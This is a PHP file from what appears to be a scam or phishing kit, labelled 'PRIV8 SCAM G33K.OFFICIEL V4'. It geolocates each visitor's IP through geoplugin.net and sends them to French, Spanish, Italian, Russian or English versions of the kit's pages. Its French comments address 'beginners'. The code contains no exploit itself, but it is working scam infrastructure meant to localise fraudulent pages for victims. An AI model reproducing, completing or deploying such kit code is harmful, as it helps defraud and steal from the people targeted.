<?php

//PRIV8 SCAM G33K.OFFICIEL V4
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
	$server  =$_SERVER['REQUEST_URI'];
	$hoste   =$_SERVER['HTTP_HOST'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $country = $ip_data->geoplugin_countryCode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
    }
// Get Lang By Country //
error_reporting(0);
$_SESSION['MOCNTR']=$countryname; // Nom du pays<============||
$_SESSION['MOCNTRCD']=$country; //Code du pays               ||===> $_SESSION['MOCNTR'] = $countryname = $_SESSION['country_name'] (To make it easier for beginners :) )
$_SESSION['country_name']=$countryname; // <=================||
error_reporting(0);
if ($country == "FR" || $country == "DZ" || $country == "MA" || $country == "TN" || $country == "CD" || $country == "MG" || $country == "CM" || $country == "CA" || $country == "CI" || $country == "BF" || $country == "NE" || $country == "SN" || $country == "ML" || $country == "RW" || $country == "BE" || $country == "GF" || $country == "TD" || $country == "HT" || $country == "BI" || $country == "BJ" || $country == "CH" || $country == "TG" || $country == "CF" || $country == "CG" || $country == "GA" || $country == "KM" || $country == "GK" || $country == "DJ" || $country == "LU" || $country == "VU" || $country == "SC" || $country == "MC") {
    $_SESSION['MONSTR_UU']="/fr.php"; // Les codes des pays parlant la langue française
} elseif ($country == "MX" || $country == "PH" || $country == "ES" || $country == "CO" || $country == "AR" || $country == "PE" || $country == "VE" || $country == "CL" || $country == "EC" || $country == "GT" || $country == "CU" || $country == "HN" || $country == "PY" || $country == "SV" || $country == "NI" || $country == "CR" || $country == "UY") {
    $_SESSION['MONSTR_UU']="/es.php"; // Les codes des pays parlant la langue espagnole
} elseif ($country == "IT" || $country == "SM") {
   $_SESSION['MONSTR_UU']="/it.php"; // Les codes des pays parlant la langue italienne
} elseif ($country == "RU" || $country == "BY" || $country == "KZ" || $country == "KG" || $country == "TJ") {
    $_SESSION['MONSTR_UU']="/ru.php"; // Les codes des pays parlant la langue russie
} 
   else {
	   $_SESSION['MONSTR_UU']="/en.php"; // Le reste des pays sera associé à la langue anglais
   }
?>